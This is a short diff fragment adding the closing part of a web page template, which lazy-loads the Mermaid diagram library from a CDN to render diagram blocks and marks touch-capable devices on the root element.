+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
